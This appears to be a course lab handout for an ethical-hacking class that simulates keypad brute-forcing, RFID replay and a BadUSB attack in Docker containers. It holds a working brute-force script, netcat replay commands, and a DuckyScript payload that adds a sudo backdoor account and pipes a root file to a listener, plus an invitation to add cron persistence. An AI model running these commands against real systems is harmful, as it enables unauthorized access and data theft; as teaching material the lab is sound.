# Week 11 Hands-On Lab: Physical Access Control Bypass (Simulated)

## CYB204 Ethical Hacking — Digital Simulation

---

## Before You Start

### Why a simulation, and what it isn't

Lockpicking needs a real lock. Cloning a real RFID card needs a real reader
and a real field to clone it from. Spoofing a real fingerprint sensor needs
a real sensor. None of that exists inside a container — **Docker can't
simulate physics.**

What it *can* do is run the **logic** underneath three of the four attack
categories from this week's slides, over a real network, so you actually
execute the attack rather than just read about it:

| Slide topic | What's simulated | What's genuinely real about it |
|---|---|---|
| Keypad bypass | A keypad door with a leaked maintenance hint and a real PIN check | You run a real brute-force script against a real reduced keyspace |
| RFID cloning | An unencrypted badge broadcasting its credential, and a door that accepts it | You genuinely capture it off the wire and genuinely replay it |
| BadUSB / Rubber Ducky | An "already-unlocked machine" with an exposed shell | You write a real DuckyScript-style payload and it genuinely executes automatically |
| Lockpicking | — | Not simulated at all. See the note at the end of this file. |
| Biometric spoofing | — | Theory-only this week (worksheet.md covers it) |

### Important Rules
✅ **DO:** Treat every technique here as something that only has a leg to
   stand on once you also understand the mitigation
❌ **DON'T:** Treat any of this as directly transferable to attacking a
   real building's access control system — the simulation stands in for
   the *logic*, not the hardware, and real systems carry real legal risk
   (see README.md's "Applicable Law" section)

---

## Setup

```bash
cd labs/week11
docker compose up -d
docker exec -it week11-attacker bash
```

Everything is ready within a few seconds (no apt installs needed on the
targets — they're plain Python).

---

## Challenge 1: Keypad Brute Force (15 minutes)

This directly implements Worksheet Task 3's scenario: a 4-digit keypad,
with keys **1, 3, and 5** showing visible wear.

```bash
curl -s http://10.10.11.10:8080/maintenance-note
```

**Question:** How many PIN combinations are there if you don't know which
keys are worn (10,000)? How many are there once you know the PIN only
uses digits from `{1, 3, 5}` (repeats allowed, 4 digits)?

_________________________________

Now write a real brute-force script — don't just guess. A starting point:

```python
import itertools, urllib.request, json

worn = ['1', '3', '5']
url = 'http://10.10.11.10:8080/unlock'

for combo in itertools.product(worn, repeat=4):
    pin = ''.join(combo)
    req = urllib.request.Request(url, data=json.dumps({'pin': pin}).encode(),
                                  headers={'Content-Type': 'application/json'})
    resp = json.loads(urllib.request.urlopen(req).read())
    if resp.get('result') == 'ACCESS GRANTED':
        print(f'PIN={pin} -> {resp["flag"]}')
        break
```

**Capture Flag 1.**

**Reflection:** The keypad service has an optional "lockout" mode
(`LOCKOUT_ENABLED`) that blocks a client after 5 failed attempts. Ask your
instructor to demo the hardened version. Why does that one mitigation —
on its own, no PIN change needed — break your script?

_________________________________

---

## Challenge 2: RFID Clone & Replay (15 minutes)

`week11-badge-system` plays two roles at once: the employee's badge
(broadcasting its credential every few seconds — the network stand-in for
an RF field) and the door reader (which accepts whatever credential string
it's shown, no questions asked).

**Read** — capture the broadcast. Requires `sudo` for raw packet capture:

```bash
sudo tcpdump -i eth0 -n -A udp port 9100 -c 1
```

Find the `BADGE:...` string in the output.

**Copy** — that string *is* the cloned credential. There's nothing else to
extract; this is the point of the exercise — an unencrypted card leaks
everything in one read.

**Replay** — present it straight to the door:

```bash
echo 'BADGE:EMP-7741-ACCT' | nc.traditional 10.10.11.11 9000
```

(Use the value you actually captured, not this example.)

**Capture Flag 2.**

**Reflection:** The slides' mitigation for this is "encrypt card
communication." Why does encryption specifically defeat a *replay* attack,
when a weaker fix like "use a longer badge ID string" would not?

_________________________________

---

## Challenge 3: BadUSB / Rubber Ducky Payload (20 minutes)

`week11-workstation` models the actual premise of a BadUSB attack: **you
already have physical access to an unlocked machine.** The device doesn't
break in — it just types faster and more reliably than a human, the
moment it's plugged in. Here, that's a plain exposed shell on port 4444.

A DuckyScript payload is just a very small, literal language:

```
REM <comment, ignored>
STRING <text typed exactly as written>
ENTER
```

Note that `STRING` does **not** auto-press Enter — real DuckyScript
doesn't either. If you want a line executed, you need an explicit `ENTER`
after it.

Write a payload file, e.g. `~/payload.txt`:

```
REM Create a backdoor account and exfiltrate a file
STRING useradd -m -s /bin/bash backdoor && echo backdoor:BadUSB123 | chpasswd && usermod -aG sudo backdoor
ENTER
STRING cat /root/confidential.txt | nc.traditional -q1 10.10.11.2 9999
ENTER
```

Translate it to literal keystrokes with the helper tool already in your
home directory, and start a listener to catch whatever the second command
sends back:

```bash
python3 ~/duckify.py ~/payload.txt > ~/payload.sh
nc.traditional -lp 9999 > ~/loot.txt &
```

Now inject it — this is the "plug in the USB device" moment:

```bash
nc.traditional -q1 10.10.11.12 4444 < ~/payload.sh
```

Check what came back:

```bash
cat ~/loot.txt
```

**Capture Flag 3.**

**Verify the backdoor actually exists** (this would be how a real attacker
keeps access after the "device" is unplugged):

```bash
echo 'id backdoor' | nc.traditional -q1 10.10.11.12 4444
```

**Reflection:** This payload ran in well under a second once injected. A
human typing the same two commands would take 10–15 seconds, with pauses
and corrections. Why does that speed difference matter for detection —
what would a security team's logging/alerting need to catch this that it
might not need for a human mistyping the same commands?

_________________________________

---

## Challenge 4 (Optional Extension): Write Your Own Payload

Using the same `duckify.py` tool, write a DuckyScript payload that does
something **other** than what's shown above — for example, append a
`cron` job that re-adds the backdoor account every hour even if someone
deletes it (persistence), or exfiltrate a different file. Document your
payload and what it achieves in your submission.

---

## Cleanup

```bash
cd labs/week11
docker compose down
```

---

## A Note on Lockpicking

Lockpicking is the one category from the slides with genuinely no digital
analogue worth building — the skill is entirely mechanical (pin stacks,
tension, feel), and a simulation of it would teach nothing transferable.
If your instructor has a practice lock + pick set (cheap, legal to own and
use on your own practice locks in Australia, commonly used in ethical
hacking courses), that's the right way to make this category hands-on
too — see README.md for a low-cost suggestion.

---

## Summary

Today you:
✓ Brute-forced a keypad using a leaked physical clue to cut the keyspace
✓ Sniffed and replayed an unencrypted credential, exactly as RFID cloning
  works in practice
✓ Wrote a real BadUSB-style payload and watched it execute automatically
  against an already-accessible machine
✓ Connected each attack directly back to the mitigation that defeats it

**Instructor Contact:** _________________________________
